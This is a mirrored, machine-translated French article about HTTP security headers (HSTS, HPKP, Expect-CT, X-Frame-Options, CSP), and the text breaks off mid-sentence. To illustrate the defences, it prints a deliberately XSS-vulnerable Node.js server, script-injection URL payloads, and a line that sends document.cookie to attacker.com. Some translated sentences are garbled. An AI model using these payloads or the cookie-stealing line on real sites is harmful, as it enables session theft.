<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>💆🏿 🖕🏻 🦂 Comment renforcer la sécurité des applications Web avec des en-têtes HTTP 👨🏽‍⚕️ 😭 🛕</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il s'agit de la troisième partie de la série sur la sécurité Web: la deuxième partie était « Sécurité Web: une introduction à HTTP », la première « Co...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Comment renforcer la sécurité des applications Web avec des en-têtes HTTP</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/edison/blog/434228/"><img src="https://habrastorage.org/getpro/habr/post_images/c8d/5c5/809/c8d5c5809e609fecf60c662139f248d2.jpg" alt="image"><br><br>  Il s'agit de la troisième partie de la série sur la sécurité Web: la deuxième partie était « <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Sécurité Web: une introduction à HTTP</a> », la première « <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Comment les navigateurs fonctionnent - Une introduction à la sécurité des applications Web</a> ». <br><br>  Comme nous l'avons vu dans les parties précédentes de cette série, les serveurs peuvent envoyer des en-têtes HTTP pour fournir au client des métadonnées supplémentaires dans la réponse, en plus d'envoyer le contenu demandé par le client.  Les clients sont ensuite autorisés à spécifier comment lire, mettre en cache ou protéger une ressource spécifique. <br><br>  Les navigateurs ont désormais implémenté une très large gamme d'en-têtes liés à la sécurité pour rendre plus difficile pour les attaquants d'exploiter les vulnérabilités.  Dans cet article, nous allons essayer de discuter de chacun d'eux, en expliquant comment ils sont utilisés, quelles attaques ils empêchent et un petit historique pour chaque rubrique. <br><a name="habracut"></a><br><blockquote> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" title="Logiciel EDISON - développement web"><img align="left" width="153" height="75" src="https://habrastorage.org/webt/w0/zl/to/w0zltoxvysbr0yeinstkfvw1wbg.png" alt="Logiciel EDISON - développement web"></a> <br clear="right">  Le message a été écrit avec le soutien d'EDISON Software, qui <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">s'efforce de faire honneur aux programmeurs russes</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partage</a> en détail <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">son expérience dans le développement de produits logiciels complexes</a> . </blockquote><h3>  HTTP Strict Transport Security (HSTS) </h3><br>  Depuis la fin de 2012, il est devenu plus facile pour les supporters de HTTPS Everywhere de faire en sorte que le client utilise toujours la version sécurisée du protocole HTTP grâce à Strict Transport Security: la ligne très simple <code>Strict-Transport-Security: max-age=3600</code> indiquera au navigateur que dans l'heure qui suit (3600 secondes), il ne doit pas interagir avec l'application via des protocoles dangereux. <br><br>  Lorsqu'un utilisateur essaie d'accéder à une application protégée par HSTS via HTTP, le navigateur refuse simplement d'aller plus loin, convertissant automatiquement les URL <code>http://</code> en <code>https://</code> . <br><br>  Vous pouvez vérifier cela localement avec le code <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/hsts</a> .  Vous devrez suivre les instructions de README (cela inclut l'installation d'un certificat SSL approuvé pour <code>localhost</code> sur votre ordinateur à l'aide de l'outil <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">mkcert</a> ), puis essayez d'ouvrir <code>https://localhost:7889</code> . <br><br>  Dans cet exemple, il y a 2 serveurs: HTTPS, qui écoute sur <code>7889</code> , et HTTP, sur le port <code>7888</code> .  Lorsque vous accédez à un serveur HTTPS, il essaiera toujours de vous rediriger vers une version HTTP qui fonctionnera car HSTS n'est pas disponible sur le serveur HTTPS.  Si vous ajoutez <code>hsts=on</code> paramètre <code>hsts=on</code> à votre URL, le navigateur convertit de force le lien vers la version <code>https://</code> .  Étant donné que le serveur sur <code>7888</code> est uniquement accessible via le protocole http, vous <code>7888</code> par <code>7888</code> une page qui ressemble à ceci. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/693/783/9e0/6937839e0473a7101847dfaba7a10a1d.png" alt="image"><br><br>  Vous pouvez être intéressé de savoir ce qui se passe lorsqu'un utilisateur visite votre site pour la première fois, car la stratégie HSTS n'est pas prédéfinie: les attaquants peuvent potentiellement tromper l'utilisateur dans la version <code>http://</code> de votre site et y lancer une attaque, donc il y a encore place pour des problèmes .  Il s'agit d'un problème grave car HSTS est un mécanisme d'approbation lors de la première utilisation.  Il essaie de s'assurer qu'après avoir visité le site Web, le navigateur sait que HTTPS doit être utilisé dans les interactions ultérieures. <br><br>  Une solution de contournement pourrait être en maintenant une énorme base de données de sites Web qui prennent en charge HSTS, ce que Chrome fait via <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">hstspreload.org</a> .  Vous devez d'abord établir votre politique, puis visiter le site Web et voir si elle peut être ajoutée à la base de données.  Par exemple, nous pouvons voir que Facebook est sur la liste. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6ce/40b/830/6ce40b8307fa218f0f6f5f8cb3ccdad9.png" alt="image"><br><br>  En soumettant votre site Web à cette liste, vous pouvez indiquer à l'avance aux navigateurs que votre site utilise HSTS, de sorte que même la première interaction entre les clients et votre serveur se fera via un canal sécurisé.  Mais c'est cher, car il faut vraiment participer au HSTS.  Si, pour une raison quelconque, vous souhaitez que votre site Web soit supprimé de la liste, ce n'est pas une tâche facile pour les fournisseurs de navigateurs: <br><blockquote>  Gardez à l'esprit que l'inclusion dans la liste de préchargement ne peut pas être facilement annulée. <br><br>  Les domaines peuvent être supprimés, mais il faut des mois pour mettre Chrome à jour pour les utilisateurs, et nous ne pouvons pas garantir les autres navigateurs.  Ne demandez pas l'inclusion dans la liste si vous n'êtes pas sûr de pouvoir prendre en charge HTTPS pour l'ensemble de votre site et de tous ses sous-domaines pendant une longue période. <br>  - Source: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://hstspreload.org/</a> </blockquote>  En effet, le fournisseur ne peut garantir que tous les utilisateurs utiliseront la dernière version de leur navigateur et que votre site sera supprimé de la liste.  Réfléchissez bien et prenez une décision en fonction de votre degré de confiance dans HSTS et de votre capacité à l'appuyer à long terme. <br><br><h3>  Épinglage de clé publique HTTP (HPKP) </h3><br>  L'épinglage de clé publique HTTP est un mécanisme qui nous permet d'indiquer au navigateur les certificats SSL à attendre lors de la connexion à nos serveurs.  Cet en-tête utilise le mécanisme d'approbation lors de la première utilisation, comme HSTS, et signifie qu'après la connexion du client à notre serveur, il stockera les informations de certificat pour les interactions ultérieures.  Si, à un moment donné, le client découvre que le serveur utilise un certificat différent, il refusera poliment de se connecter, ce qui rendra très difficile la conduite d'une attaque d'homme au milieu (MITM). <br><br>  Voici à quoi ressemble la politique HPKP: <br><br><pre> <code class="plaintext hljs">Public-Key-Pins: pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu="; pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3="; max-age=3600; includeSubDomains; report-uri="https://pkpviolations.example.org/collect"</code> </pre> <br>  L'en-tête annonce quels certificats le serveur utilisera (dans ce cas, deux d'entre eux) en utilisant le hachage de certificat, et inclut des informations supplémentaires telles que la durée de vie de cette directive ( <code>max-age = 3600</code> ) et plusieurs autres détails.  Malheureusement, cela n'a aucun sens de creuser plus profondément pour comprendre ce que nous pouvons faire avec la sécurisation de la clé publique, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">car Chrome n'approuve pas cette fonctionnalité</a> - un signal que son adoption est vouée à l'échec. <br><br>  La solution de Chrome n'est pas irrationnelle, c'est juste une conséquence des risques associés à la sécurisation de la clé publique.  Si vous perdez votre certificat ou faites simplement une erreur pendant les tests, votre site sera inaccessible aux utilisateurs qui l'ont déjà visité (pendant la période de validité de la directive <code>max-age</code> , qui est généralement des semaines ou des mois). <br><br>  En raison de ces conséquences potentiellement catastrophiques, l'adoption du HPKP était extrêmement faible et il y avait des moments <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">où les grands sites Web n'étaient pas disponibles en raison d'une mauvaise configuration</a> .  Compte tenu de tout ce qui précède, Chrome a décidé que les utilisateurs seraient mieux sans la protection offerte par HPKP, et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">les chercheurs en sécurité ne sont pas complètement opposés à cette décision</a> . <br><br><h3>  Expect-CT </h3><br>  Alors que HPKP désapprouvait, un nouvel en-tête est apparu pour empêcher les certificats SSL frauduleux pour les clients: <code>Expect-CT</code> . <br><br>  Le but de cet en-tête est d'indiquer au navigateur qu'il doit effectuer des «vérifications d'antécédents» supplémentaires pour vérifier que le certificat est authentique: lorsque le serveur utilise l'en <code>Expect-CT</code> tête <code>Expect-CT</code> , il demande essentiellement au client de vérifier que les certificats utilisés se trouvent dans les journaux de certificats de transparence ouverts. (CT). <br><br>  L'initiative de transparence des certificats est le fruit des efforts de Google pour garantir: <br><blockquote>  Une plate-forme ouverte pour la surveillance et l'audit des certificats SSL en temps quasi réel. <br><br>  En particulier, la transparence des certificats vous permet de détecter les certificats SSL émis par erreur par une autorité de certification ou obtenus par malveillance d'une autre autorité de certification sans faille.  Il vous permet également d'identifier les autorités de certification qui ont commis une fraude et d'émettre des certificats par malveillance. <br>  - Source: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://www.certificate-transparency.org/</a> </blockquote>  L'en-tête prend cette forme: <br><br><pre> <code class="plaintext hljs">Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</code> </pre> <br>  Dans cet exemple, le serveur demande au navigateur: <br><br><ul><li>  activer la vérification CT pour l'application actuelle pendant une période de 1 heure (3600 secondes) </li><li>  <code>enforce</code> appliquer cette politique et refuser l'accès à l'application en cas de violation </li><li>  envoyer un rapport à l'URL spécifiée en cas de violation </li></ul><br>  L'objectif de l'initiative de transparence des certificats est de détecter les certificats émis par erreur ou malveillants (et les autorités de certification frauduleuses) plus tôt, plus rapidement et plus précisément que toute autre méthode utilisée auparavant. <br><br>  En activant l'utilisation de l'en <code>Expect-CT</code> tête <code>Expect-CT</code> , vous pouvez prendre cette initiative pour améliorer l'état de sécurité de votre application. <br><br><h3>  X-frame-options </h3><br>  Imaginez que vous voyez une page Web comme celle-ci <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2f5/87f/f15/2f587ff15a4e613cc91e13122d49e22b.png" alt="image"><br><br>  Dès que vous cliquez sur le lien, vous comprenez que tout l'argent de votre compte bancaire a disparu.  Qu'est-il arrivé? <br><br>  Vous avez été victime d'une attaque par détournement de clics. <br><br>  Un attaquant vous a dirigé vers son site Web, qui affiche un lien de clic très attrayant.  Malheureusement, il a également intégré la page iframe avec <code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code> , mais l'a <code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code> en définissant la transparence à 0%.  Nous pensions avoir cliqué sur la page d'origine, essayant de gagner un tout nouveau hamer, mais à la place, le navigateur a fixé un clic sur l'iframe, un clic dangereux qui a confirmé le transfert d'argent. <br><br>  La plupart des systèmes bancaires exigent que vous fournissiez un NIP unique pour confirmer les transactions, mais votre banque n'a pas rattrapé l'heure et tout votre argent a été perdu. <br><br>  L'exemple est assez extrême, mais il devrait vous faire comprendre quelles peuvent être les conséquences d'une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">attaque utilisant le détournement de clics</a> .  L'utilisateur a l'intention de cliquer sur un lien spécifique, tandis que le navigateur provoquera un clic sur la page "invisible", qui a été intégrée comme cadre. <br><br>  J'ai inclus un exemple de cette vulnérabilité dans <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/clickjacking</a> .  Si vous exécutez l'exemple et essayez de cliquer sur le lien «attrayant», vous verrez que le vrai clic est intercepté par l'iframe, ce qui le rend non transparent, de sorte qu'il est plus facile pour vous de détecter le problème.  Un exemple devrait être disponible sur <code><a href="">http://localhost:7888</a></code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e11/a28/3a9/e11a283a9d4f69c80622666fdcc647c2.png" alt="image"><br><br>  Heureusement, les navigateurs ont trouvé une solution simple à ce problème: <code>X-Frame-Options</code> (XFO), qui vous permet de décider si votre application peut être incorporée comme iframes sur des sites Web externes.  Popularisé par Internet Explorer 8, XFO a été introduit pour la première fois en 2009 et est toujours pris en charge par tous les principaux navigateurs. <br><br>  Cela fonctionne comme ceci: lorsque le navigateur voit un iframe, il le charge et vérifie que son XFO lui permet d'être inclus dans la page actuelle avant de le rendre. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8c3/61e/04e/8c361e04e5a18bac008a106e47090dc1.png" alt="image"><br><br>  Valeurs prises en charge: <br><br><ul><li>  <code>DENY</code> : cette page Web ne peut être intégrée nulle part.  Il s'agit du plus haut niveau de protection car il ne permet à personne d'intégrer notre contenu. </li><li>  <code>SAMEORIGIN</code> : Seules les pages du même domaine que l'actuel peuvent insérer cette page.  Cela signifie que <code>example.com/embedder</code> peut charger <code>example.com/embedded</code> si sa stratégie est définie sur <code>SAMEORIGIN</code> .  Il s'agit d'une politique plus calme qui permet aux propriétaires d'un site Web particulier d'intégrer leurs propres pages dans leur application. </li><li>  <code>ALLOW-FROM uri</code> : pièce jointe autorisée à partir de l'URI spécifié.  Nous pourrions, par exemple, autoriser un site Web externe autorisé à intégrer notre contenu en utilisant <code>ALLOW-FROM https://external.com</code> .  Ceci est généralement utilisé lorsque vous allez autoriser des développeurs tiers à intégrer votre contenu via un iframe. </li></ul><br>  Un exemple de réponse HTTP qui inclut la politique XFO la plus stricte possible est la suivante: <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK Content-Type: application/json X-Frame-Options: DENY ...</code> </pre> <br>  Pour montrer comment les navigateurs se comportent lorsque XFO est activé, nous pouvons simplement changer notre exemple d'URL en <code>http://localhost:7888 /?xfo=on</code> .  Le paramètre <code>xfo=on</code> indique au serveur d'inclure <code>X-Frame-Options: deny</code> dans la réponse, et nous pouvons voir comment le navigateur restreint l'accès à l'iframe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ecf/751/7b7/ecf7517b7954476cacc64a7e3cb38d87.png" alt="image"><br><br>  XFO était considéré comme le meilleur moyen de prévenir les attaques basées sur les clics basées sur les frames jusqu'à ce qu'un autre titre entre en jeu après quelques années - Content Security Policy ou CSP pour faire court. <br><br><h3>  Politique de sécurité du contenu (CSP) </h3><br>  L'en <code>Content-Security-Policy</code> tête <code>Content-Security-Policy</code> , abrégé CSP, fournit des utilitaires de nouvelle génération pour empêcher une variété d'attaques, de XSS (cross-site scripting) à l'interception de clics (click-jacking). <br><br>  Pour comprendre comment CSP nous aide, vous devez d'abord penser à un vecteur d'attaque.  Disons que nous venons de créer notre propre moteur de recherche Google, où il y a un champ de saisie simple avec un bouton de soumission. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e92/afc/397/e92afc3972e0d40182d68544e8e51d5c.png" alt="image"><br><br>  Cette application web n'a rien de magique.  C'est simple <br><br><ul><li>  affiche le formulaire </li><li>  permet à l'utilisateur de rechercher </li><li>  affiche les résultats de la recherche avec le mot clé recherché par l'utilisateur </li></ul><br>  Lorsque nous effectuons une recherche simple, l'application renvoie les informations suivantes: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/5a7/977/79b/5a797779b4394913cbfef82a6e0dafe9.png" alt="image"><br><br>  Incroyable  Notre application a incroyablement compris notre recherche et a trouvé une image similaire.  Si nous nous penchons sur le code source disponible sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/xss</a> , nous nous rendrons bientôt compte que l'application présente un problème de sécurité, car tout mot clé qu'un utilisateur recherche est directement imprimé en HTML: <br><br><pre> <code class="xml hljs">var qs = require('querystring') var url = require('url') var fs = require('fs') require('http').createServer((req, res) =&gt; { let query = qs.parse(url.parse(req.url).query) let keyword = query.search || '' let results = keyword ? `You searched for "${keyword}", we found:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://placekitten.com/200/300"</span></span></span><span class="hljs-tag"> /&gt;</span></span>` : `Try searching...` res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results)) }).listen(7888) <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Search The Web<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"search"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"__KEYWORD__"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"results"</span></span></span><span class="hljs-tag">&gt;</span></span> __RESULTS__ <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  C'est une conséquence désagréable.  Un attaquant peut créer un lien spécifique qui exécute du JavaScript arbitraire dans le navigateur de la victime. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3ee/628/c3a/3ee628c3af5ea6176284c5451423957c.png" alt="image"><br><br>  Si vous avez le temps et la patience d'exécuter l'exemple localement, vous pouvez rapidement comprendre toute la puissance de CSP.  J'ai ajouté un paramètre de chaîne de requête qui inclut CSP, afin que nous puissions essayer de passer à une URL malveillante avec CSP activé: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">localhost</a> : 7888 /? search =% 3Cscript + type% 3D 3D% 22text% 2Fjavascript% 22% 3Ealert% 28% 27You% 20have% 20been% 20PWNED% 27% 29% 3C% 2Fscript% 3E &amp; csp = on </blockquote><img src="https://habrastorage.org/getpro/habr/post_images/903/763/6a1/9037636a1b4baa19cced586860caa993.png" alt="image"><br><br>  Comme vous le voyez dans l'exemple ci-dessus, nous avons indiqué au navigateur que notre stratégie CSP autorise uniquement les scripts inclus à partir de la même source de l'URL actuelle, que nous pouvons facilement vérifier en accédant à l'URL en utilisant curl et en regardant l'en-tête de réponse: <br><br><pre> <code class="plaintext hljs">$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on" HTTP/1.1 200 OK X-XSS-Protection: 0 Content-Security-Policy: default-src 'self' Date: Sat, 11 Aug 2018 10:46:27 GMT Connection: keep-alive</code> </pre> <br>  Étant donné que l'attaque XSS a été effectuée à l'aide d'un script intégré (un script directement intégré au contenu HTML), le navigateur a poliment refusé de l'exécuter, garantissant la sécurité de notre utilisateur.  Imaginez qu'au lieu d'afficher simplement une boîte de dialogue d'avertissement, un attaquant configurerait une redirection vers son propre domaine via du code JavaScript, qui pourrait ressembler à ceci: <br><br><pre> <code class="plaintext hljs">window.location = `attacker.com/${document.cookie}`</code> </pre> <br>  Ils pourraient voler tous les cookies utilisateur, qui peuvent contenir des données très confidentielles (plus à ce sujet dans le prochain article). <br><br>  À présent, il devrait être clair comment CSP nous aide à prévenir un certain nombre d'attaques sur les applications Web.  Vous définissez une politique, et le navigateur s'y conformera strictement, refusant d'exécuter des ressources qui violeront la politique. <br><br>  Une option intéressante pour CSP est le mode de rapport uniquement.  Au lieu d'utiliser l'en <code>Content-Security-Policy</code> tête <code>Content-Security-Policy</code> , vous pouvez d'abord vérifier l'effet du CSP sur votre site en disant au navigateur de simplement signaler les erreurs sans bloquer l'exécution du script, etc. Utilisation de l'en <code>Content-Security-Policy-Report-Only</code> tête <code>Content-Security-Policy-Report-Only</code> . <br><br>  Les rapports vous permettront de comprendre quels changements critiques peuvent être causés par la stratégie CSP que vous souhaitez déployer et de les corriger en conséquence.  Nous pouvons même fournir l'URL du rapport et le navigateur nous enverra le rapport.  Voici un exemple complet de stratégie de rapport uniquement: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector</code> </pre> <br>  Les stratégies CSP elles-mêmes peuvent être un peu compliquées, par exemple dans l'exemple suivant: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com</code> </pre> <br>  Cette politique définit les règles suivantes: <br><br><ul><li>  les scripts exécutables (par exemple JavaScript) ne peuvent être téléchargés <code>scripts.example.com</code> partir de <code>scripts.example.com</code> </li><li>  Les images peuvent être téléchargées à partir de n'importe quelle source ( <code>img-src: *</code> ) </li><li>  le contenu vidéo ou audio peut être téléchargé à partir de deux sources: <code>medias.example.com</code> et <code>medias.legacy.example.com</code> </li></ul><br>  Comme vous pouvez le voir, il peut y avoir de nombreux politiciens, et si nous voulons offrir une protection maximale à nos utilisateurs, cela peut être un processus assez fastidieux.  Cependant, la rédaction d'une politique CSP complète est une étape importante vers l'ajout d'une couche de sécurité supplémentaire à nos applications Web. <br><br>  Pour plus d'informations sur CSP, je recommanderais <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a> . <br><br><h3>  Protection X-XSS </h3><br>  Bien que remplacé par CSP, l'en <code>X-XSS-Protection</code> tête <code>X-XSS-Protection</code> fournit le même type de protection.  Cet en-tête est utilisé pour atténuer les attaques XSS dans les anciens navigateurs qui ne prennent pas totalement en charge CSP.  Cet en-tête n'est pas pris en charge par Firefox. <br><br>  Sa syntaxe est très similaire à ce que nous venons de voir: <br><br><pre> <code class="plaintext hljs">X-XSS-Protection: 1; report=http://xssviolations.example.com/collector</code> </pre> <br>  Reflected XSS est le type d'attaque le plus courant lorsque le texte saisi est imprimé par le serveur sans aucune vérification, et c'est là que cet en-tête résout vraiment.  Si vous voulez le voir par vous-même, je vous recommande d'essayer l'exemple sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/xss</a> , car en ajoutant <code>xss=on</code> à l'URL, il montre ce que fait le navigateur lorsque la protection XSS est activée .  Si nous entrons une chaîne malveillante dans le champ de recherche, par exemple, le navigateur refuse poliment d'exécuter le script et explique la raison de sa décision: <br><br><pre> <code class="plaintext hljs">The XSS Auditor refused to execute a script in 'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on' because its source code was found within the request. The server sent an 'X-XSS-Protection' header requesting this behavior.</code> </pre> <br>  Encore plus intéressant est le comportement par défaut dans Chrome lorsqu'une stratégie CSP ou XSS n'est pas spécifiée sur une page Web.  Un script que nous pouvons tester en ajoutant le paramètre <code>xss=off</code> à notre URL ( <code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code> ): <br><br><img src="https://habrastorage.org/getpro/habr/post_images/938/8c4/6fd/9388c46fd9f6c9370d0f9ff3b2a65210.png" alt="image"><br><br>  Étonnamment, Chrome est suffisamment prudent pour empêcher le rendu des pages, ce qui rend difficile la création de XSS en miroir.  Impressionnant jusqu'où les navigateurs sont allés. <br><br><h3>  Politique de fonctionnalité </h3><br>  En juillet 2018, le chercheur en sécurité <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Scott Helm a</a> publié un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">article de blog</a> très intéressant détaillant le nouveau 